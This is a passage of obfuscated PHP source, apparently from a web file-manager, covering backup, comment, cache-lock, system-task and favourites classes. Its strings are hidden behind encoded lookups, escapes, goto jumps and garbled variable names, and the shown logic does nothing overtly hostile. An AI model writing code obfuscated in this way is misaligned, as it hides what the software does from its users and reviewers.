$_SERVER[¦»×‡Ãã]; $ğ³™„Œô = _get($åÁá¶ö­, $æ¼âçŞŞ[171], $æ¼âçŞŞ[91]); if (!in_array($ğ³™„Œô, array($æ¼âçŞŞ[849], $æ¼âçŞŞ[1211]))) { $åÁá¶ö­[$æ¼âçŞŞ[171]] = $ğ³™„Œô == $æ¼âçŞŞ[91] ? $æ¼âçŞŞ[1211] : $æ¼âçŞŞ[849]; } } public function lastItem() { $¯÷Ë® = $this->listData(); return !empty($¯÷Ë®[0]) ? $¯÷Ë®[0] : null; } public function kill($ º—Ï…ğ) { $„×ŞŸŒ¨ =& $_SERVER[¦»×‡Ãã]; $œ÷Œû…ú = $this->listData($ º—Ï…ğ); if (!$œ÷Œû…ú || empty($œ÷Œû…ú[$„×ŞŸŒ¨[32]])) { return !0; } Task::kill($„×ŞŸŒ¨[855]); Task::kill($„×ŞŸŒ¨[873]); Task::kill($„×ŞŸŒ¨[882]); $´²Ò¡ = $œ÷Œû…ú[$„×ŞŸŒ¨[32]]; $”ÁÀæ× = TEMP_FILES . $„×ŞŸŒ¨[852] . $´²Ò¡ . $„×ŞŸŒ¨[8]; IO::remove($”ÁÀæ×, !1); return $this->remove($ º—Ï…ğ); } public function remove($ª©”²Öœ) { $ù¸ó£Ç‡ = $this->listData($ª©”²Öœ); if (!$ù¸ó£Ç‡) { return !0; } return $this->backupRemove($ù¸ó£Ç‡); } private function backupRemove($¿ÎÎ¼æ) { parent::remove($¿ÎÎ¼æ[$_SERVER[¦»×‡Ãã][475]]); $¨ñÎ¤¾ = $this->backupPath($¿ÎÎ¼æ); IO::remove($¨ñÎ¤¾, !1); return !0; } private function backupPath($Ë¨Ğ¨€—) { $«Íâ’˜¹ =& $_SERVER[¦»×‡Ãã]; $Ç›éê¦µ = $Ë¨Ğ¨€—[$«Íâ’˜¹[32]]; $—¯©›Üî = Model($«Íâ’˜¹[843])->get($«Íâ’˜¹[844]); $¡ ÅÎµà = substr(md5($«Íâ’˜¹[845] . $—¯©›Üî . $Ç›éê¦µ), 0, 8); return "\173\151\157\72{$Ë¨Ğ¨€—[$«Íâ’˜¹[825]]}\175\57\144\141\164\141\x62\x61\x73\x65\57\142\x61\143\153\x75\x70\x2f" . $Ç›éê¦µ . $«Íâ’˜¹[11] . $¡ ÅÎµà; } public function start() { $»Æçú“ =& $_SERVER[¦»×‡Ãã]; if ($GLOBALS[$»Æçú“[6]][$»Æçú“[92]][$»Æçú“[1999]] != $»Æçú“[91]) { return !0; } $ƒ°ş‰Å = $this->config(); if (!$ƒ°ş‰Å || $ƒ°ş‰Å[$»Æçú“[1742]] != $»Æçú“[91]) { return !1; } if ($ƒ°ş‰Å[$»Æçú“[171]] == $»Æçú“[849]) { $½êŒ÷‡‹ = Model($»Æçú“[843])->get($»Æçú“[1324]); if ($½êŒ÷‡‹ == $»Æçú“[1325]) { $ƒ°ş‰Å[$»Æçú“[171]] = $»Æçú“[1211]; } } $¥í—•ÒÂ = $this->process(); foreach ($¥í—•ÒÂ as $ÁµğÙ¢Ù) { if ($ÁµğÙ¢Ù) { return Task::restart($ÁµğÙ¢Ù[$»Æçú“[475]]); } } $Œù‰›ìõ = new Backup(); $©¡ôéËÛ = $Œù‰›ìõ->db(); if ($©¡ôéËÛ) { $©¡ôéËÛ = $Œù‰›ìõ->dbFile(); if ($©¡ôéËÛ && $ƒ°ş‰Å[$»Æçú“[171]] == $»Æçú“[849]) { $©¡ôéËÛ = $Œù‰›ìõ->file(); } } Backup::set(array($»Æçú“[823] => 1, $»Æçú“[834] => time())); return !0; } public function process() { $èç…Ò€è =& $_SERVER[¦»×‡Ãã]; $·Àõ•×’ = array($èç…Ò€è[830] => Task::get($èç…Ò€è[855]), $èç…Ò€è[835] => Task::get($èç…Ò€è[873]), $èç…Ò€è[230] => Task::get($èç…Ò€è[882])); $à¿¬ÕÅ¢ = !1; foreach ($·Àõ•×’ as &$ı€²°å±) { if ($à¿¬ÕÅ¢) { $ı€²°å± = !1; continue; } if ($ı€²°å±) { $ÁÏ†¶–˜ = intval(_get($ı€²°å±, $èç…Ò€è[1777], 0)); if (time() - $ÁÏ†¶–˜ > 7200) { Task::kill($ı€²°å±[$èç…Ò€è[475]]); $à¿¬ÕÅ¢ = !0; $ı€²°å± = !1; } } } return $·Àõ•×’; } public function restore() { $ıŸõâîØ =& $_SERVER[¦»×‡Ãã]; ActionCall($ıŸõâîØ[1138], !0, 1); ActionCall($ıŸõâîØ[1138], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\x6d\x65\x6e\164"; protected $tableMeta = array("\164\x61\x62\154\145\116\x61\155\145" => "\x63\157\x6d\x6d\145\x6e\x74\137\155\x65\x74\141", "\x6d\x65\x74\141\x46\151\x65\154\144" => "\143\157\x6d\x6d\x65\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ÒùĞ»¶Î) { $¥èîà¬¯ =& $_SERVER[¦»×‡Ãã]; if ($ÒùĞ»¶Î[$¥èîà¬¯[2000]]) { $ıó‡œô¹ = $this->where(array($¥èîà¬¯[2001] => $ÒùĞ»¶Î[$¥èîà¬¯[2000]]))->find(); if (!$ıó‡œô¹ || $ıó‡œô¹[$¥èîà¬¯[190]] != $ÒùĞ»¶Î[$¥èîà¬¯[190]] || $ıó‡œô¹[$¥èîà¬¯[569]] != $ÒùĞ»¶Î[$¥èîà¬¯[569]]) { return !1; } $this->where(array($¥èîà¬¯[2001] => $ÒùĞ»¶Î[$¥èîà¬¯[2000]]))->setAdd($¥èîà¬¯[2002], 1); } $ÒùĞ»¶Î[$¥èîà¬¯[2003]] = 0; $ÒùĞ»¶Î[$¥èîà¬¯[2002]] = 0; $ÒùĞ»¶Î[$¥èîà¬¯[823]] = 1; return $this->add($ÒùĞ»¶Î); } public function commentCount($öù¨ú´¨, $åâÛù†, $ØåÈêŠ£ = false) { $»Í«µÕµ =& $_SERVER[¦»×‡Ãã]; if (!$öù¨ú´¨) { return array(); } if (is_string($öù¨ú´¨) || is_int($öù¨ú´¨)) { $öù¨ú´¨ = array($öù¨ú´¨); } $¼¨ï‚³î = array($»Í«µÕµ[569], $»Í«µÕµ[2004] => $»Í«µÕµ[565]); $·ış˜½É = array($»Í«µÕµ[569] => array($»Í«µÕµ[7], $öù¨ú´¨), $»Í«µÕµ[190] => $åâÛù†); if ($ØåÈêŠ£) { $·ış˜½É[$»Í«µÕµ[1772]] = $ØåÈêŠ£; } $µÉ¸ğÃ¯ = $this->field($¼¨ï‚³î)->where($·ış˜½É)->group($»Í«µÕµ[569])->select(); return array_to_keyvalue($µÉ¸ğÃ¯, $»Í«µÕµ[569], $»Í«µÕµ[565]); } public function starTarget($æ­éÚå, $ËûŠì¡¿) { $®“Ü•Öƒ =& $_SERVER[¦»×‡Ãã]; $”Š‹×·² = $æ­éÚå + self::TYPE_STAR_OFFSET; $Ï…©“ = array($®“Ü•Öƒ[1772] => USER_ID, $®“Ü•Öƒ[190] => $”Š‹×·², $®“Ü•Öƒ[569] => $ËûŠì¡¿); $Í·£½Ú˜ = $this->where($Ï…©“)->find(); if ($Í·£½Ú˜) { return $this->where(array($®“Ü•Öƒ[475] => $Í·£½Ú˜[$®“Ü•Öƒ[475]]))->delete(); } $Ñ³¥¥‡Ü = array($®“Ü•Öƒ[2000] => 0, $®“Ü•Öƒ[1772] => USER_ID, $®“Ü•Öƒ[823] => 1, $®“Ü•Öƒ[171] => $®“Ü•Öƒ[12], $®“Ü•Öƒ[190] => $”Š‹×·², $®“Ü•Öƒ[569] => $ËûŠì¡¿, $®“Ü•Öƒ[2003] => 0, $®“Ü•Öƒ[2002] => 0); return $this->add($Ñ³¥¥‡Ü); } public function starTargetCount($Ìï¸ô¹, $ÈÈ‘ÇÑ‡) { $ßş¡™‰± =& $_SERVER[¦»×‡Ãã]; $Ú›ù¿Şª = $ÈÈ‘ÇÑ‡ + self::TYPE_STAR_OFFSET; $í—¼ê¸ = $this->commentCount($Ìï¸ô¹, $Ú›ù¿Şª); $ì­–®òÊ = $this->commentCount($Ìï¸ô¹, $Ú›ù¿Şª, USER_ID); return array($ßş¡™‰±[2005] => $í—¼ê¸, $ßş¡™‰±[2006] => $ì­–®òÊ); } public function starTargetUserList($¶•Ã£´è, $ãà£À²Õ) { $­şš¬ü =& $_SERVER[¦»×‡Ãã]; $öß»¾Æ = $¶•Ã£´è + self::TYPE_STAR_OFFSET; $«œó®Ÿ = array($­şš¬ü[569] => $ãà£À²Õ, $­şš¬ü[190] => $öß»¾Æ); $ÙŞü¨ŠÙ = $this->where($«œó®Ÿ)->count(); $úğÄü»Œ = array($­şš¬ü[332] => $ÙŞü¨ŠÙ, $­şš¬ü[2007] => array()); if (!$ÙŞü¨ŠÙ) { return $úğÄü»Œ; } $‚ ôàë» = $this->field($­şš¬ü[1772])->where($«œó®Ÿ)->limit(500)->select(); $‚ ôàë» = array_to_keyvalue($‚ ôàë», $­şš¬ü[12], $­şš¬ü[1772]); $úğÄü»Œ[$­şš¬ü[2007]] = Model($­şš¬ü[577])->userListInfo($‚ ôàë»); return $úğÄü»Œ; } public function prasiseUserList($ƒÌ‰Õ»³) { $û—Â¹ =& $_SERVER[¦»×‡Ãã]; $Ï÷­Š½Ê = array($û—Â¹[2008] => $ƒÌ‰Õ»³); $ ŒÊÜŠ³ = $this->where($Ï÷­Š½Ê)->find(); $¡È°¨Œı = _get($ ŒÊÜŠ³, $û—Â¹[2003], 0); $ñ½‹–‘ˆ = array($û—Â¹[332] => $¡È°¨Œı, $û—Â¹[2007] => array()); if (!$¡È°¨Œı) { return $ñ½‹–‘ˆ; } $±Ş³¥«ù = Model($û—Â¹[2009])->field($û—Â¹[1772])->where($Ï÷­Š½Ê)->limit(500)->select(); $±Ş³¥«ù = array_to_keyvalue($±Ş³¥«ù, $û—Â¹[12], $û—Â¹[1772]); $ñ½‹–‘ˆ[$û—Â¹[2007]] = Model($û—Â¹[577])->userListInfo($±Ş³¥«ù); return $ñ½‹–‘ˆ; } public function remove($Ã¦õ”‘µ) { $Ø½Ãèœ‰ =& $_SERVER[¦»×‡Ãã]; $á²ä·›‘ = array($Ø½Ãèœ‰[2001] => $Ã¦õ”‘µ); $ğ¨ÍöâÏ = $this->where($á²ä·›‘)->find(); if ($ğ¨ÍöâÏ[$Ø½Ãèœ‰[2000]]) { $this->where(array($Ø½Ãèœ‰[2001] => $ğ¨ÍöâÏ[$Ø½Ãèœ‰[2000]]))->setAdd($Ø½Ãèœ‰[2002], -1); } return $this->where($á²ä·›‘)->delete(); } public function edit($Å‡£ßìĞ, $áØ»æÖ›) { $³ØŠÙû =& $_SERVER[¦»×‡Ãã]; $—Áğ¯Ûñ = array($³ØŠÙû[2001] => $Å‡£ßìĞ); return $this->where($—Áğ¯Ûñ)->save(array($³ØŠÙû[2010] => $áØ»æÖ›)); } public function prasise($öÒÒÖ¿ó) { $ı–Âı®± =& $_SERVER[¦»×‡Ãã]; $Éïû¡‘Æ = Model($ı–Âı®±[2011]); $éü¯ÁÅ = array($ı–Âı®±[2001] => $öÒÒÖ¿ó, $ı–Âı®±[1763] => USER_ID); $şÙöŠÚ = $Éïû¡‘Æ->where($éü¯ÁÅ)->find(); if (!$şÙöŠÚ) { $Éïû¡‘Æ->add($éü¯ÁÅ); $Ë¾ÒÑ = $this->where(array($ı–Âı®±[2001] => $öÒÒÖ¿ó))->setAdd($ı–Âı®±[2003], 1); } else { $Éïû¡‘Æ->where($éü¯ÁÅ)->delete(); $Ë¾ÒÑ = $this->where(array($ı–Âı®±[2001] => $öÒÒÖ¿ó))->setAdd($ı–Âı®±[2003], -1); } return $Ë¾ÒÑ; } public function targetInfo($ø«æè‰«, $ÄİÕ”ã) { $ ™¸ˆÂã =& $_SERVER[¦»×‡Ãã]; $ÆÆÕ‡ˆ = array($ ™¸ˆÂã[648] => $ø«æè‰«, $ ™¸ˆÂã[649] => $ÄİÕ”ã); $óà²È…˜ = $this->where($ÆÆÕ‡ˆ)->count(); $š‰ÆÑ˜— = "\x52\x49\107\110\124\x20\112\x4f\111\116\40{$this->tablePrefix}\x63\x6f\155\x6d\145\156\x74\x5f\x70\162\x61\151\x73\x65\40\x73\x74\141\162\40\x6f\x6e\40\143\157\155\155\145\x6e\164\x2e\x63\157\155\x6d\145\156\164\111\104\40\75\40\163\x74\141\x72\56\143\x6f\155\x6d\x65\x6e\164\x49\x44"; $ùçº®´Û = $this->alias($ ™¸ˆÂã[430])->where($ÆÆÕ‡ˆ)->join($š‰ÆÑ˜—, $ ™¸ˆÂã[2012])->count(); $ë¤…º¡© = array($ ™¸ˆÂã[2013] => $óà²È…˜, $ ™¸ˆÂã[2014] => $ùçº®´Û); return $ë¤…º¡©; } public function listData($–â´ˆÜÏ) { $ƒ¨œê¤‰ =& $_SERVER[¦»×‡Ãã]; if (isset($–â´ˆÜÏ[$ƒ¨œê¤‰[2015]])) { if ($–â´ˆÜÏ[$ƒ¨œê¤‰[2015]]) { $–â´ˆÜÏ[$ƒ¨œê¤‰[2008]] = array($ƒ¨œê¤‰[1092], intval($–â´ˆÜÏ[$ƒ¨œê¤‰[2015]])); } unset($–â´ˆÜÏ[$ƒ¨œê¤‰[2015]]); } if (isset($–â´ˆÜÏ[$ƒ¨œê¤‰[2016]])) { if ($–â´ˆÜÏ[$ƒ¨œê¤‰[2016]]) { $–â´ˆÜÏ[$ƒ¨œê¤‰[2008]] = array($ƒ¨œê¤‰[1089], intval($–â´ˆÜÏ[$ƒ¨œê¤‰[2016]])); } unset($–â´ˆÜÏ[$ƒ¨œê¤‰[2016]]); } return $this->_listData($–â´ˆÜÏ); } private function _listData($ï»«­Â) { $”ç›¾÷í =& $_SERVER[¦»×‡Ãã]; $ñÄÅÓèÆ = $this->where($ï»«­Â)->_makeOrder()->selectPage(100); $this->_listAppendParent($ñÄÅÓèÆ[$”ç›¾÷í[445]]); $this->_listAppendUser($ñÄÅÓèÆ[$”ç›¾÷í[445]]); $this->_listAppendMeta($ñÄÅÓèÆ[$”ç›¾÷í[445]]); return $ñÄÅÓèÆ; } private function _makeOrder() { $û‡Êµç± =& $_SERVER[¦»×‡Ãã]; $ŠÕÛïÛÕ = array($û‡Êµç±[2003], $û‡Êµç±[2002], $û‡Êµç±[231]); $ºıáßùÇ = Input::get($û‡Êµç±[530], $û‡Êµç±[7], $û‡Êµç±[497], $ŠÕÛïÛÕ); $¯ªÁ«²¯ = Input::get($û‡Êµç±[531], $û‡Êµç±[7], $û‡Êµç±[1765], array($û‡Êµç±[2017], $û‡Êµç±[526])); $ö’£ñø¡ = $ºıáßùÇ . $û‡Êµç±[53] . $¯ªÁ«²¯; return $this->order($ö’£ñø¡); } private function _listAppendParent(&$¾“üÓæÂ) { $§ÙŸŠù =& $_SERVER[¦»×‡Ãã]; $œêöœÙ  = array_unique(array_to_keyvalue($¾“üÓæÂ, $§ÙŸŠù[12], $§ÙŸŠù[2000])); $œêöœÙ  = array_remove_value($œêöœÙ , $§ÙŸŠù[228]); if (!$œêöœÙ ) { return; } $ú’Ä·ù = $this->where(array($§ÙŸŠù[2001] => array($§ÙŸŠù[7], $œêöœÙ )))->select(); $ú’Ä·ù = array_to_keyvalue($ú’Ä·ù, $§ÙŸŠù[2008]); foreach ($¾“üÓæÂ as &$œÛÎˆĞô) { if (isset($ú’Ä·ù[$œÛÎˆĞô[$§ÙŸŠù[2000]]])) { $œÛÎˆĞô[$§ÙŸŠù[2018]] = $ú’Ä·ù[$œÛÎˆĞô[$§ÙŸŠù[2000]]]; } } unset($œÛÎˆĞô); } private function _listAppendUser(&$°Õ±€é) { $Ì‘ûŒÙ =& $_SERVER[¦»×‡Ãã]; $áèƒ¿ü = array_unique(array_to_keyvalue($°Õ±€é, $Ì‘ûŒÙ[12], $Ì‘ûŒÙ[1772])); $áèƒ¿ü = array_remove_value($áèƒ¿ü, $Ì‘ûŒÙ[228]); if (count($áèƒ¿ü) == 0) { return; } foreach ($°Õ±€é as $“‹œ­Ù) { if (isset($“‹œ­Ù[$Ì‘ûŒÙ[2018]])) { $áèƒ¿ü[] = $“‹œ­Ù[$Ì‘ûŒÙ[2018]][$Ì‘ûŒÙ[1772]]; } } $³¿¢Ä‹î = Model($Ì‘ûŒÙ[598])->userListInfo($áèƒ¿ü); foreach ($°Õ±€é as &$“‹œ­Ù) { $“‹œ­Ù[$Ì‘ûŒÙ[662]] = $³¿¢Ä‹î[$“‹œ­Ù[$Ì‘ûŒÙ[1772]]]; if (isset($“‹œ­Ù[$Ì‘ûŒÙ[2018]])) { $“‹œ­Ù[$Ì‘ûŒÙ[2018]][$Ì‘ûŒÙ[662]] = $³¿¢Ä‹î[$“‹œ­Ù[$Ì‘ûŒÙ[2018]][$Ì‘ûŒÙ[1772]]]; } } unset($“‹œ­Ù); } private function _listAppendMeta(&$à“‚è—õ) { $Œ³œÌ =& $_SERVER[¦»×‡Ãã]; $·è›·àÇ = array_unique(array_to_keyvalue($à“‚è—õ, $Œ³œÌ[12], $Œ³œÌ[2008])); $·è›·àÇ = array_remove_value($·è›·àÇ, $Œ³œÌ[228]); if (!$·è›·àÇ) { return; } foreach ($à“‚è—õ as $Ë˜üû„¬) { if (isset($Ë˜üû„¬[$Œ³œÌ[2018]])) { $·è›·àÇ[] = $Ë˜üû„¬[$Œ³œÌ[2018]][$Œ³œÌ[2008]]; } } $áìüï’Ó = $this->metaList($·è›·àÇ); if (!$áìüï’Ó) { return !1; } foreach ($à“‚è—õ as &$Ë˜üû„¬) { $Ë˜üû„¬[$Œ³œÌ[539]] = $áìüï’Ó[$Ë˜üû„¬[$Œ³œÌ[2008]]]; if (isset($Ë˜üû„¬[$Œ³œÌ[2018]])) { $Ë˜üû„¬[$Œ³œÌ[2018]][$Œ³œÌ[539]] = $áìüï’Ó[$Ë˜üû„¬[$Œ³œÌ[2018]][$Œ³œÌ[2008]]]; } } unset($Ë˜üû„¬); } private function metaList($âÌğöº) { $æ¯µóô =& $_SERVER[¦»×‡Ãã]; if (!$âÌğöº) { return array(); } $ñÆÛÏÂÛ = array($æ¯µóô[2008] => array($æ¯µóô[7], $âÌğöº)); $ùÌë“™¦ = Model($æ¯µóô[2019])->where($ñÆÛÏÂÛ)->select(); $ùÌë“™¦ = array_to_keyvalue_group($ùÌë“™¦, $æ¯µóô[2008]); foreach ($ùÌë“™¦ as $ğƒ†‘« => $‹ËÏúî) { $à¡ ì¢ = array(); foreach ($‹ËÏúî as $³ºòÄ’¡) { $à¡ ì¢[$³ºòÄ’¡[$æ¯µóô[97]]] = $³ºòÄ’¡[$æ¯µóô[450]]; } $ùÌë“™¦[$ğƒ†‘«] = $à¡ ì¢; } return $ùÌë“™¦ ? $ùÌë“™¦ : array(); } public function removeTarget($á×‡Î¬§, $ÀÄßÄŒ) { $íÎŠ°¬† =& $_SERVER[¦»×‡Ãã]; if (!$ÀÄßÄŒ) { return !0; } $ÀÄßÄŒ = is_array($ÀÄßÄŒ) ? $ÀÄßÄŒ : array($ÀÄßÄŒ); $­ı¼ÜŞç = array($íÎŠ°¬†[190] => $á×‡Î¬§, $íÎŠ°¬†[569] => array($íÎŠ°¬†[7], $ÀÄßÄŒ)); $¡Ì ‡Ö = $this->field($íÎŠ°¬†[2008])->where($­ı¼ÜŞç)->select(); $ÑßÜÕø‰ = array_to_keyvalue($¡Ì ‡Ö, $íÎŠ°¬†[12], $íÎŠ°¬†[2008]); if (!$ÑßÜÕø‰) { return !0; } $­ı¼ÜŞç = array($íÎŠ°¬†[2008] => array($íÎŠ°¬†[7], $ÑßÜÕø‰)); $this->where($­ı¼ÜŞç)->delete(); Model($íÎŠ°¬†[2011])->where($­ı¼ÜŞç)->delete(); Model($íÎŠ°¬†[2020])->where($­ı¼ÜŞç)->delete(); } } goto E¦‡’Çñâ„; Eù‘ã˜¶§: function binCheckBigger($Æ””—“, $Ëµ¸ÙÀÂ) { return $Æ””—“ > $Ëµ¸ÙÀÂ; } $_SERVER[$_SERVER[º‚¢É§í][3]] = (base64_decode('ODUyNA==').base64_decode('NjE='))+0;$_12hb="vdi1ragk5hny92os3cpq7mxljze4fb6ut08wcxjih1kyr8dgq90bavswt6";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($İ€ñ…šÙ, $µ‰Ğ‘) { $¯ƒ³ˆè =& $_SERVER[¦»×‡Ãã]; if (isset(self::$_methodList[$İ€ñ…šÙ])) { return @call_user_func_array(self::$_methodList[$İ€ñ…šÙ], $µ‰Ğ‘); } else { if (method_exists($this, $İ€ñ…šÙ)) { return call_user_func_array(array($this, $İ€ñ…šÙ), $µ‰Ğ‘); } else { think_exception(__CLASS__ . $¯ƒ³ˆè[4] . $İ€ñ…šÙ . $¯ƒ³ˆè[5]); } } } public static function __callStatic($®ÊÏ“Å†, $ ¸å˜é) { if (isset(self::$_methodListStatic[$®ÊÏ“Å†])) { return call_user_func_array(self::$_methodListStatic[$®ÊÏ“Å†], $ ¸å˜é); } else { if (method_exists(self, $®ÊÏ“Å†)) { return call_user_func_array(array(self, $®ÊÏ“Å†), $ ¸å˜é); } else { show_json("{$®ÊÏ“Å†}\x28\51\x20\156\157\x74\40\145\170\x69\x73\x74\73", !1); } } } public static function addMethod($¥“ù¸ş, $İğà•âÎ) { self::$_methodList[$¥“ù¸ş] = $İğà•âÎ; } public static function addMethodStatic($†éş³ŸÒ, $¤¼Âì±’) { self::$_methodListStatic[$†éş³ŸÒ] = $¤¼Âì±’; } } goto fÄêÁİ‹Ü¦; BÌï‚ùÓºÈ: class CacheLockMemcached { public function lock($–“ª†Şà, $ïßÔ­› = 0) { $÷·ÆÈ’ = Cache::init(); $ÔÒ®Ğãü = microtime(!0) + $ïßÔ­›; while (microtime(!0) < $ÔÒ®Ğãü) { $‰æŞå”£ = $÷·ÆÈ’->get($–“ª†Şà); if (!$‰æŞå”£ || $‰æŞå”£ < microtime(!0)) { $ÓÎ……Í£ = $÷·ÆÈ’->handle->add($–“ª†Şà, $ÔÒ®Ğãü, $ïßÔ­›); if ($ÓÎ……Í£) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($äÙ„«ò¡) { return Cache::init()->get($äÙ„«ò¡); } public function unlock($³ …úÙË) { return Cache::init()->remove($³ …úÙË); } } class CacheLockDatabase { public function lock($¸í†ß™İ, $“ï”Íéø = 0) { $ÁÄ¬ĞÁ¹ = Model($_SERVER[¦»×‡Ãã][901]); $ŞÓå¥ë¹ = microtime(!0) + $“ï”Íéø; while (microtime(!0) < $ŞÓå¥ë¹) { $×µË¦Ç = $ÁÄ¬ĞÁ¹->get($¸í†ß™İ); if (!$×µË¦Ç || $×µË¦Ç < microtime(!0)) { $¼¡ß´«– = $ÁÄ¬ĞÁ¹->set($¸í†ß™İ, $ŞÓå¥ë¹); if ($¼¡ß´«–) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ìñáöã) { return Model($_SERVER[¦»×‡Ãã][901])->get($Ìñáöã); } public function unlock($ê¥Ş°õ) { Model($_SERVER[¦»×‡Ãã][901])->remove($ê¥Ş°õ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¶›šÒÉô, $¼àŸ¹–É) { $³Ñ•¼³Ã =& $_SERVER[¦»×‡Ãã]; if (!class_exists($³Ñ•¼³Ã[939])) { show_json($³Ñ•¼³Ã[940], !1); } $this->cacheTime = $¼àŸ¹–É; $this->handle = new Memcached(); if (is_array($¶›šÒÉô[$³Ñ•¼³Ã[941]]) && count($¶›šÒÉô[$³Ñ•¼³Ã[941]]) >= 1) { foreach ($¶›šÒÉô[$³Ñ•¼³Ã[941]] as $·²“•øÚ) { $†ì§Ş‹‰ = explode($³Ñ•¼³Ã[4], $·²“•øÚ); $this->handle->addServer($†ì§Ş‹‰[0], $†ì§Ş‹‰[1]); } } else { $this->handle->addServer($¶›šÒÉô[$³Ñ•¼³Ã[208]], $¶›šÒÉô[$³Ñ•¼³Ã[209]]); } } public function set($³ÆşñÇì, $Ïê—”À©, $¸İõÃÈÌ = false) { $¸İõÃÈÌ = $¸İõÃÈÌ ? $¸İõÃÈÌ : $this->cacheTime; return $this->handle->set($³ÆşñÇì, $Ïê—”À©, $¸İõÃÈÌ); } public function get($«ÁØ¤‚³) { return $this->handle->get($«ÁØ¤‚³); } public function remove($º¼Ÿ­”ó) { return $this->handle->delete($º¼Ÿ­”ó); } public function deleteAll() { return $this->handle->flush(); } } goto B¸ÆĞÏÇÀ÷; C›Îæ±ÅŠ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\x74\141\163\x6b\114\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\164\x79\160\x65", "\145\x76\x65\x6e\164", "\x74\x69\x6d\145", "\x64\145\x73\x63", "\x73\x79\163\x74\145\x6d", "\145\156\x61\142\154\145", "\154\x61\163\x74\122\x75\x6e", "\163\157\x72\164"); public function listData($âî¬•½ = false, $”ºŠ—¦¶ = "\163\x6f\162\164", $· ÎÅÚ = false) { return parent::listData($âî¬•½, $”ºŠ—¦¶, $· ÎÅÚ); } public function add($²âêöôİ) { $ğ•îÏñØ =& $_SERVER[¦»×‡Ãã]; $ü¼ßÁ† = $this->findByName($²âêöôİ[$ğ•îÏñØ[32]]); if ($ü¼ßÁ†) { return !1; } $²âêöôİ[$ğ•îÏñØ[1723]] = 0; $²âêöôİ[$ğ•îÏñØ[1995]] = $this->getSort(); return parent::insert($²âêöôİ); } private function getSort() { $¡ê•Çâ =& $_SERVER[¦»×‡Ãã]; $¸ƒ³çÒç = parent::listData(); $í¡™’¬ß = array_to_keyvalue($¸ƒ³çÒç, $¡ê•Çâ[12], $¡ê•Çâ[1995]); return empty($í¡™’¬ß) ? 0 : max($í¡™’¬ß) + 1; } public function update($óú™äÜ©, $ã†ç¦±Ë) { $×“•Éœ =& $_SERVER[¦»×‡Ãã]; $úÌØíö‡ = $this->listData($óú™äÜ©); $ÙÓûÈ¶Ä = $this->findByName($ã†ç¦±Ë[$×“•Éœ[32]]); if (!$úÌØíö‡ || $ÙÓûÈ¶Ä && $ÙÓûÈ¶Ä[$×“•Éœ[475]] != $úÌØíö‡[$×“•Éœ[475]]) { return !1; } return parent::update($óú™äÜ©, $ã†ç¦±Ë); } public function remove($éàÒ™ğÅ, $˜‹¿Ô— = false) { $ŞÜ’ ‡š =& $_SERVER[¦»×‡Ãã]; $ÔÀêÒÍ” = $this->listData($éàÒ™ğÅ); if (!$ÔÀêÒÍ”) { return; } if (!$˜‹¿Ô— && $ÔÀêÒÍ”[$ŞÜ’ ‡š[191]] == $ŞÜ’ ‡š[91]) { return !1; } return parent::remove($éàÒ™ğÅ); } public function enable($ÙÕ ÕıÂ, $ó­¨„ô) { return $this->update($ÙÕ ÕıÂ, array($_SERVER[¦»×‡Ãã][2434] => $ó­¨„ô)); } public function run($à—Á³£›) { return $this->update($à—Á³£›, array($_SERVER[¦»×‡Ãã][2446] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($İÍÕëâ) { $Óî©ù– =& $_SERVER[¦»×‡Ãã]; return array($Óî©ù–[2086] => array(USER_ID, $Óî©ù–[2447])); } protected function listData() { $ØşüÙşí =& $_SERVER[¦»×‡Ãã]; $Éêº¤¨“ = array($ØşüÙşí[1763] => USER_ID, $ØşüÙşí[557] => 0); $ º·Ù®¾ = $ØşüÙşí[2448]; $ïĞõ„Œ§ = $this->field($ º·Ù®¾)->where($Éêº¤¨“)->order($ØşüÙşí[2449])->select(); return $ïĞõ„Œ§ ? $ïĞõ„Œ§ : array(); } protected function resetCache() { } protected function listView() { $«Àš›ı =& $_SERVER[¦»×‡Ãã]; $…¤×Õ­Ç = $this->listData(); $‡ÂæÔìÆ = array_filter_by_field($…¤×Õ­Ç, $«Àš›ı[33], $«Àš›ı[490]); $éŞáåœñ = array_to_keyvalue($‡ÂæÔìÆ, $«Àš›ı[12], $«Àš›ı[87]); if (!$éŞáåœñ) { return $…¤×Õ­Ç; } $»‹ùƒï¨ = 2000; $¬¨Û“¤ı = array($«Àš›ı[491] => array($«Àš›ı[492], $éŞáåœñ)); $‘˜¡Àøû = Model($«Àš›ı[897])->listSource($¬¨Û“¤ı, $»‹ùƒï¨); $‘˜¡Àøû = array_merge($‘˜¡Àøû[$«Àš›ı[86]], $‘˜¡Àøû[$«Àš›ı[85]]); $‘˜¡Àøû = array_to_keyvalue($‘˜¡Àøû, $«Àš›ı[193]); foreach ($…¤×Õ­Ç as $Øƒéú¼ => $ŠøâõïÆ) { $«Ñ¯òı… = $‘˜¡Àøû[$ŠøâõïÆ[$«Àš›ı[87]]]; $«Ñ¯òı… = $«Ñ¯òı… ? $«Ñ¯òı… : array(); $…¤×Õ­Ç[$Øƒéú¼] = array_merge($«Ñ¯òı…, $ŠøâõïÆ); } return $…¤×Õ­Ç; } protected function addFav($òÇ‡Ğïò, $½ÉÏ¤õ… = '', $åßÜ¯½Ì = "\x73\x6f\165\x72\x63\145") { $óÉ¨‡ÙÁ =& $_SERVER[¦»×‡Ãã]; $¸¦ñÖÇ¤ = array($óÉ¨‡ÙÁ[1763] => USER_ID, $óÉ¨‡ÙÁ[557] => 0, $óÉ¨‡ÙÁ[496] => $åßÜ¯½Ì, $óÉ¨‡ÙÁ[495] => $òÇ‡Ğïò); if ($this->where($¸¦ñÖÇ¤)->find()) { return !1; } $¸¦ñÖÇ¤ = array($óÉ¨‡ÙÁ[1763] => 